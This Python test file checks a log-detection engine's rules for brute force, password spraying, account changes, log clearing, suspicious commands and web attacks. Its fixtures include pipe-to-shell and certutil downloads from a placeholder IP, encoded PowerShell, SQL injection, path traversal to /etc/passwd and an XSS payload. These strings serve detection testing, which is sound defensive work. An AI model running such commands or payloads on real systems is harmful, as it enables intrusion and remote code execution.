"""Positive and negative cases for every rule in soclog/rules.json."""

from __future__ import annotations

import copy
import json
import tempfile
import unittest
from datetime import datetime, timedelta
from pathlib import Path

from soclog.engine import evaluate, load_rules
from soclog.models import Event

OFFICIAL_TECHNIQUES = {
    "T1110.001": "Brute Force: Password Guessing",
    "T1110.003": "Brute Force: Password Spraying",
    "T1078": "Valid Accounts",
    "T1136": "Create Account",
    "T1136.001": "Create Account: Local Account",
    "T1098.007": "Account Manipulation: Additional Local or Domain Groups",
    "T1070.001": "Indicator Removal: Clear Windows Event Logs",
    "T1059.001": "Command and Scripting Interpreter: PowerShell",
    "T1059.004": "Command and Scripting Interpreter: Unix Shell",
    "T1105": "Ingress Tool Transfer",
    "T1190": "Exploit Public-Facing Application",
    "T1595.002": "Active Scanning: Vulnerability Scanning",
    "T1595.003": "Active Scanning: Wordlist Scanning",
}


def at(**kwargs) -> datetime:
    values = {"year": 2026, "month": 10, "day": 27, "hour": 12, "minute": 0, "second": 0}
    values.update(kwargs)
    return datetime(**values)


def event(kind: str, when: datetime, **kwargs) -> Event:
    raw = kwargs.pop("raw", None)
    body = Event(
        timestamp=when,
        event_type=kind,
        raw=raw or f"{when.isoformat()} {kind} {kwargs.get('user')} {kwargs.get('src_ip')} {kwargs.get('command')} {kwargs.get('path')}",
        **kwargs,
    )
    return body


class DetectionTests(unittest.TestCase):
    def setUp(self) -> None:
        self.rules = load_rules()

    def _ids(self, events: list[Event]) -> list[str]:
        return [alert.rule_id for alert in evaluate(events, self.rules)]

    def test_rule_file_uses_official_technique_names(self) -> None:
        seen = set()
        for rule in self.rules:
            self.assertNotIn(rule["id"], seen)
            seen.add(rule["id"])
            self.assertEqual(OFFICIAL_TECHNIQUES[rule["mitre_id"]], rule["mitre_name"])
            if "spray_mitre_id" in rule:
                self.assertEqual(OFFICIAL_TECHNIQUES[rule["spray_mitre_id"]], rule["spray_mitre_name"])
            self.assertTrue(rule["recommendation"].strip())

    def test_brute_force_threshold_and_window(self) -> None:
        ip = "203.0.113.10"

        def failures(times: list[datetime]) -> list[Event]:
            return [event("ssh_failed", moment, src_ip=ip, user="root") for moment in times]

        self.assertNotIn("auth-brute-force", self._ids(failures([at(second=i) for i in range(4)])))
        self.assertIn("auth-brute-force", self._ids(failures([at(second=i * 10) for i in range(5)])))

        spread = [at() + timedelta(seconds=700 * i) for i in range(5)]
        self.assertNotIn("auth-brute-force", self._ids(failures(spread)))

        first = [at(minute=0, second=i) for i in range(5)]
        later = [at(hour=15, second=i) for i in range(5)]
        alerts = [alert for alert in evaluate(failures(first + later), self.rules) if alert.rule_id == "auth-brute-force"]
        self.assertEqual(len(alerts), 2)
        self.assertEqual(alerts[0].mitre_id, "T1110.001")
        self.assertEqual(alerts[0].source_ip, ip)
        self.assertEqual(alerts[0].user, "root")
        self.assertGreaterEqual(len(alerts[0].evidence), 5)

    def test_password_spray_distinct_users_not_a_per_account_guess(self) -> None:
        start = at(hour=15)
        light = [
            event("win_logon_failed", start + timedelta(seconds=index), src_ip="203.0.113.20", user=name)
            for index, name in enumerate(["alpha", "bravo", "charlie", "delta", "echo"])
        ]
        self.assertEqual(self._ids(light), ["password-spray"])

        four = light[:4]
        self.assertEqual(self._ids(four), [])

        heavy: list[Event] = []
        for user_index, name in enumerate(["alpha", "bravo", "charlie", "delta", "echo"]):
            for attempt in range(5):
                heavy.append(
                    event(
                        "ssh_failed",
                        start + timedelta(seconds=user_index * 50 + attempt),
                        src_ip="203.0.113.21",
                        user=name,
                    )
                )
        found = self._ids(heavy)
        self.assertNotIn("password-spray", found)
        self.assertEqual(found.count("auth-brute-force"), 5)

    def test_success_after_failures_suppresses_the_plain_brute_alert(self) -> None:
        ip = "203.0.113.30"
        failures = [event("ssh_failed", at(minute=40, second=i * 10), src_ip=ip, user="admin") for i in range(6)]
        success = event("ssh_success", at(minute=41, second=10), src_ip=ip, user="admin")
        alerts = evaluate(failures + [success], self.rules)
        self.assertEqual([alert.rule_id for alert in alerts], ["success-after-failures"])
        self.assertEqual(alerts[0].severity, "critical")
        self.assertEqual(alerts[0].mitre_id, "T1110.001")
        self.assertEqual(alerts[0].user, "admin")
        self.assertEqual(alerts[0].event_count, 7)

        too_few = failures[:4] + [success]
        self.assertNotIn("success-after-failures", self._ids(too_few))

        other_ip = event("ssh_success", at(minute=41), src_ip="198.51.100.8", user="admin")
        kept = self._ids(failures + [other_ip])
        self.assertIn("auth-brute-force", kept)
        self.assertNotIn("success-after-failures", kept)

        late = event("ssh_success", at(minute=40) + timedelta(seconds=700), src_ip=ip, user="admin")
        late_ids = self._ids(failures + [late])
        self.assertIn("auth-brute-force", late_ids)
        self.assertNotIn("success-after-failures", late_ids)

    def test_success_after_a_spray_uses_the_spraying_technique(self) -> None:
        ip = "198.51.100.90"
        failures = [
            event("win_logon_failed", at(hour=17, second=i * 10), src_ip=ip, user=name)
            for i, name in enumerate(["guest", "finance", "hr", "sales", "intern"])
        ]
        success = event("win_logon_success", at(hour=17, minute=1), src_ip=ip, user="guest")
        alerts = evaluate(failures + [success], self.rules)
        self.assertEqual([alert.rule_id for alert in alerts], ["success-after-failures"])
        self.assertEqual(alerts[0].mitre_id, "T1110.003")
        self.assertEqual(alerts[0].mitre_name, OFFICIAL_TECHNIQUES["T1110.003"])

    def test_unusual_hours_boundaries_are_utc(self) -> None:
        def login(hour: int, minute: int = 0) -> list[str]:
            return self._ids([event("ssh_success", at(hour=hour, minute=minute), src_ip="198.51.100.40", user="ops")])

        self.assertEqual(login(23, 0), ["unusual-hours"])
        self.assertEqual(login(22, 0), ["unusual-hours"])
        self.assertEqual(login(4, 59), ["unusual-hours"])
        self.assertEqual(login(21, 59), [])
        self.assertEqual(login(5, 0), [])
        self.assertEqual(login(10, 0), [])
        alerts = evaluate(
            [event("win_logon_success", at(hour=23, minute=15), src_ip="198.51.100.77", user="analyst")],
            self.rules,
        )
        self.assertEqual(alerts[0].severity, "low")
        self.assertEqual(alerts[0].mitre_id, "T1078")
        self.assertIn("South Africa", alerts[0].what_to_do_next)

    def test_account_creation_and_privileged_groups_only(self) -> None:
        created = [
            event("user_created", at(hour=18), user="svcbackup"),
            event("win_user_created", at(hour=18, minute=10), user="tempadmin"),
        ]
        self.assertEqual(self._ids(created), ["local-user-created", "windows-user-created"])
        local = evaluate([created[0]], self.rules)[0]
        windows = evaluate([created[1]], self.rules)[0]
        self.assertEqual(local.mitre_id, "T1136.001")
        self.assertEqual(windows.mitre_id, "T1136")

        memberships = [
            event("group_membership", at(hour=18, minute=1), user="svcbackup", group="sudo"),
            event("group_membership", at(hour=18, minute=2), user="svcbackup", group="Administrators"),
            event("group_membership", at(hour=18, minute=3), user="svcbackup", group="Domain Admins"),
            event("group_membership", at(hour=18, minute=4), user="ops", group="Users"),
            event("group_membership", at(hour=18, minute=5), user="ops", group="developers"),
            event("group_membership", at(hour=18, minute=6), user="ops", group="Remote Desktop Users"),
        ]
        alerts = evaluate(memberships, self.rules)
        self.assertEqual(
            [(alert.user, alert.title) for alert in alerts],
            [
                ("svcbackup", "svcbackup was added to sudo"),
                ("svcbackup", "svcbackup was added to Administrators"),
                ("svcbackup", "svcbackup was added to Domain Admins"),
            ],
        )
        self.assertTrue(all(alert.mitre_id == "T1098.007" for alert in alerts))

    def test_audit_log_cleared(self) -> None:
        alerts = evaluate([event("audit_log_cleared", at(hour=18, minute=30), user="Administrator")], self.rules)
        self.assertEqual(alerts[0].rule_id, "audit-log-cleared")
        self.assertEqual(alerts[0].severity, "critical")
        self.assertEqual(alerts[0].mitre_id, "T1070.001")
        self.assertEqual(self._ids([event("win_logon_success", at(), src_ip="192.0.2.10", user="ops")]), [])

    def test_command_patterns(self) -> None:
        cases = [
            ("encoded-powershell", "powershell.exe -NoProfile -EncodedCommand QQBjAG0AZQA=", True),
            ("encoded-powershell", "powershell.exe -NoProfile -Command Get-Date", False),
            ("encoded-powershell", "powershell.exe -NoProfile -Encoding UTF8 -Command Get-Date", False),
            ("encoded-powershell", "powershell.exe -Command \"[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQA='))\"", True),
            ("shell-pipe-download", "/bin/bash -c curl -fsSL http://203.0.113.80/setup.sh | bash", True),
            ("shell-pipe-download", "/usr/bin/curl https://203.0.113.80/health", False),
            ("wget-to-tmp", "/usr/bin/wget -O /tmp/setup.sh http://203.0.113.80/setup.sh", True),
            ("wget-to-tmp", "/usr/bin/wget -O /var/log/app.log http://192.0.2.10/app.log", False),
            ("curl-to-tmp", "/usr/bin/curl -o /tmp/stage.bin http://203.0.113.80/stage.bin", True),
            ("curl-to-tmp", "/usr/bin/curl -o /var/tmp/stage.bin http://203.0.113.80/stage.bin", False),
            ("certutil-download", "certutil.exe -urlcache -split -f http://203.0.113.80/tool.bin C:\\Users\\Public\\tool.bin", True),
            ("certutil-download", "certutil.exe -hashfile C:\\Windows\\notepad.exe SHA256", False),
            (
                "powershell-download",
                "powershell.exe -Command \"Invoke-WebRequest -OutFile C:\\Users\\Public\\note.txt http://203.0.113.80/note.txt\"",
                True,
            ),
            ("powershell-download", "powershell.exe -Command Get-Date", False),
        ]
        for rule_id, command, expected in cases:
            found = self._ids([event("process", at(hour=18, minute=20), user="Administrator", command=command)])
            if expected:
                self.assertIn(rule_id, found, command)
            else:
                self.assertNotIn(rule_id, found, command)
        pipe = evaluate(
            [event("sudo_command", at(hour=18, minute=5), user="www-data", command="curl http://203.0.113.80/a.sh | sh")],
            self.rules,
        )
        self.assertEqual(pipe[0].mitre_id, "T1059.004")
        encoded = evaluate(
            [event("process", at(hour=18, minute=20), user="Administrator", command="powershell.exe -enc QQBjAG0AZQA=")],
            self.rules,
        )
        self.assertEqual(encoded[0].mitre_id, "T1059.001")

    def test_web_attack_patterns_and_benign_requests(self) -> None:
        def hit(path: str, agent: str = "Mozilla/5.0", status: int = 200) -> Event:
            return event("http_request", at(hour=12), src_ip="203.0.113.50", path=path, user_agent=agent, status=status)

        self.assertIn("web-sqli", self._ids([hit("/search?q=1%27%20OR%201%3D1")]))
        self.assertIn("web-sqli", self._ids([hit("/items?id=1+UNION+SELECT+1,2,3")]))
        self.assertNotIn("web-sqli", self._ids([hit("/shop?id=1")]))
        self.assertNotIn("web-sqli", self._ids([hit("/shop?order=date")]))

        self.assertIn("web-traversal", self._ids([hit("/download?file=../../etc/passwd")]))
        self.assertNotIn("web-traversal", self._ids([hit("/index.html")]))

        self.assertIn("web-xss", self._ids([hit("/comment?q=%3Cscript%3Ealert(1)%3C/script%3E")]))
        self.assertNotIn("web-xss", self._ids([hit("/comment?q=hello")]))

        self.assertIn("web-scanner-ua", self._ids([hit("/robots.txt", agent="Nikto/2.1.6")]))
        self.assertNotIn("web-scanner-ua", self._ids([hit("/tools/nmap", agent="Mozilla/5.0")]))
        scanner = evaluate([hit("/", agent="sqlmap/1.7")], self.rules)
        self.assertEqual(scanner[0].mitre_id, "T1595.002")

        many = [
            event(
                "http_request",
                at(hour=12, minute=2, second=i * 4),
                src_ip="203.0.113.50",
                path=f"/missing-{i}",
                status=404,
                user_agent="Mozilla/5.0",
            )
            for i in range(12)
        ]
        burst = evaluate(many, self.rules)
        self.assertEqual([alert.rule_id for alert in burst], ["web-404-burst"])
        self.assertEqual(burst[0].mitre_id, "T1595.003")
        self.assertEqual(burst[0].event_count, 12)
        self.assertEqual(self._ids(many[:11]), [])

        quiet = [
            event(
                "http_request",
                at(hour=9, second=i),
                src_ip="192.0.2.10",
                path=path,
                status=status,
                user_agent="Mozilla/5.0",
            )
            for i, (path, status) in enumerate([("/", 200), ("/missing", 404), ("/also-missing", 404), ("/third", 404)])
        ]
        self.assertEqual(self._ids(quiet), [])

    def test_disabled_rule_and_invalid_pattern_are_reported(self) -> None:
        rules = copy.deepcopy(self.rules)
        for rule in rules:
            if rule["id"] == "audit-log-cleared":
                rule["enabled"] = False
        alerts = evaluate([event("audit_log_cleared", at(), user="Administrator")], rules)
        self.assertEqual(alerts, [])

        bad = {
            "version": 1,
            "rules": [
                {
                    "id": "broken",
                    "type": "regex",
                    "title": "Broken",
                    "severity": "low",
                    "mitre_id": "T1105",
                    "mitre_name": "Ingress Tool Transfer",
                    "recommendation": "no",
                    "fields": ["command"],
                    "pattern": "(",
                }
            ],
        }
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "rules.json"
            path.write_text(json.dumps(bad), encoding="utf-8")
            with self.assertRaises(ValueError):
                load_rules(path)


if __name__ == "__main__":
    unittest.main()
